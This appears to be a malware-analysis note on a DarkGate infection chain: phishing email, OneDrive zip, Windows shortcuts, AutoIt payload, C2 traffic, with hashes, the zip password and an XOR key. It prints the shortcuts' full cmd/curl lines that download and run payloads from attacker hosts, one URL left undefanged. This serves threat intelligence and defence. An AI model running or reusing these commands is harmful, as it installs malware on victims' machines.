@@ -1,0 +1,107 @@
+2023-10-20 (MONDAY): DARKGATE INFECTION
+
+INFECTION CHAIN:
+
+- email --> OneDrive link --> downloaded zip archive --> Windows shortcut --> 
+  traffic to download/run copy of autoit3.exe & .au3 file --> DarkGate C2
+
+EXAMPLES OF LINKS FROM EMAIL:
+
+- hxxps://api.onedrive[.]com/v1.0/shares/s!Ag2WX7fH733iakkLqEW72orwcd0/root/content
+- hxxps://api.onedrive[.]com/v1.0/shares/s!Aqb18Qp47DUecVRKbWtAMx-mRJY/root/content
+
+EXAMPLE OF REDIRECTED URL FOR ZIP ARCHIVE:
+
+- hxxps://ooqknq.am.files.1drv[.]com y4m71PC_iRhMldt7OGTuQjjkZGCdee4k8v20vxYlTA4x5i
+2mQoldSgqiwUgxz9LIUN3IBK65WemgtNVWfB11GOOB_0-hwqpMlsbUfkpyInyIQE9sU40SxNBQgidFy2n4b
+gvvDg5oLP4ZiupF1b41mlN3pgQXPtxZxx13mucOall4uA2XvIwEq6yMEfuOXFe0Qbge97UdfMpBOdRxbg8s
+OTP0g/Wire_Transfer_Recipient.pdf.zip
+
+DOWNLOADED ZIP ARCHIVE:
+
+- SHA256 hash: 2888922c2d748ea0498725011645efb6d4f35c858e3a158d58357df12a5e63cc
+- File size: 1,688 bytes
+- File type: Zip archive data, at least v2.0 to extract, compression method=deflate
+- File name: Wire_Transfer_Recipient.pdf.zip
+- File description: password-protected zip archive
+- Password: 8340
+
+CONTENTS OF THE ZIP ARCHIVE:
+
+- SHA256 hash: 3ee01212c840eaee1d11c78169d1deb7f9fa133cbb12f105918328f36afdd971
+- File size: 1,446 bytes
+- File type: MS Windows shortcut
+- File name: Screenshot_20_11_2023-4839.png.lnk
+- File description: Windows shortcut to install DarkGate
+- Shortcut: C:\Windows\system32\cmd.exea/c start /min /b ping -n 4 localhost > nul &&
+ curl -s -o "C:\Users\Public\Seed.exe" hxxp://45.154.98[.]21/Seed.exe && curl -s -o 
+ "C:\Users\Public\leaf.au3" hxxp://45.154.98[.]21/leaf.au3 && "C:\Users\Public\Seed.exe"
+ "C:\Users\Public\leaf.au3" && "C:\Users\Public\Seed.exe" "C:\Users\Public\leaf.au3" &&
+ "C:\Users\Public\Seed.exe" "C:\Users\Public\leaf.au3"
+
+- SHA256 hash: 299cbdc608b446a588e324c7a6950cfbf623a988bba3ce5e2d767191a4819210
+- File size: 68 bytes
+- File type: ASCII text, with CRLF line terminators
+- File name: Wire details.txt
+- File description: Decoy text file with fake transaction number (not malicious)
+
+- SHA256 hash: 2aa219e648895ec611aa69f1a484c8e58866aa5f4c0ba020a65443b819d20c25
+- File size: 1,692 bytes
+- File type: MS Windows shortcut
+- File name: Wire_Transfer_Recipient.pdf.lnk
+- File description: Windows shortcut to install DarkGate
+- Shortcut: C:\Windows\system32\cmd.exeÞ/c start /min /b  && curl -s -o "C:\Users\Public\unsupported-version.pdf" http://screenshot.photos/unsupported-version.pdf &&
+ "C:\Users\Public\unsupported-version.pdf" && curl -s -o "C:\Users\Public\Seed.exe"
+ hxxp://45.154.98[.]21/Seed.exe && curl -s -o "C:\Users\Public\leaf.au3"
+ hxxp://45.154.98[.]21/leaf.au3 && "C:\Users\Public\Seed.exe" "C:\Users\Public\leaf.au3" &&
+ "C:\Users\Public\Seed.exe" "C:\Users\Public\leaf.au3" && "C:\Users\Public\Seed.exe"
+ "C:\Users\Public\leaf.au3"
+
+DOWNLOADED FILES FOR DARKGATE:
+
+- SHA256 hash: 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d
+- File size: 893,608 bytes
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File location: hxxp://45.154.98[.]21/Seed.exe
+- File location: C:\Users\Public\Seed.exe
+- File description: Copy of Autoit3.exe, version 3.3.14.5 (not malicious)
+
+- SHA256 hash: 35f034ecf5f0f3b808eca8a6f6f811e732dcc45bbae67117828bd7e253abbfec
+- File size: 503,232 bytes
+- File type: data
+- File location: hxxp://45.154.98[.]21/leaf.au3
+- File location: C:\Users\Public\leaf.au3
+- File description: malicilous .au3 file for DarkGate infection
+
+- SHA256 hash: 749d66c6911fc44367d6d8e702e73c329eb63c452afdb4b774c95f217e7f56ba
+- File size: 35,432 bytes
+- File location: PDF document, version 1.7, 1 pages
+- File location: hxxp://screenshot[.]photos/unsupported-version.pdf
+- File location: C:\Users\Public\unsupported-version.pdf
+- File description: Decoy PDF file (not malicious)
+
+PERSISTENT .AU3 FILE FOR DARKGATE:
+
+- SHA256 hash: e9dc9177b7aea4ef9d5f902f4b86d246dceac838e85b52ef2a3edb7dc8448905
+- File size: 512,732 bytes
+- File type: data
+- File location: C:\ProgramData\ebchdgg\bdbeehk.au3
+- File description: persistent .au3 file for DarkGate infection
+
+ASCII STRING FOR XOR ENCODING OF EMBEDDED EXE IN THE ABOVE .AU3 FILE:
+
+- qeAfpMps
+
+DECODED EXE FILE CARVED FROM THE ABOVE .AU3 FILE:
+
+- SHA256 hash: c8711d9c9c0ea4201bd28cc83da804b193fe9b87ff9bd55be3e7ed13b675b2d4
+- File size: 414,720 bytes
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+
+TRAFFIC FROM AN INFECTION:
+
+- 45.154.98[.]21 port 80 - screenshot[.]photos - GET /unsupported-version.pdf
+- 45.154.98[.]21 port 80 - 45.154.98[.]21 GET /Seed.exe
+- 45.154.98[.]21 port 80 - 45.154.98[.]21 GET /leaf.au3
+- 188.246.224[.]221 port 8080 - attempted TCP connections, not successful
+- 188.246.224[.]221 port 2351 - 188.246.224[.]221:2351 POST / HTTP/1.0
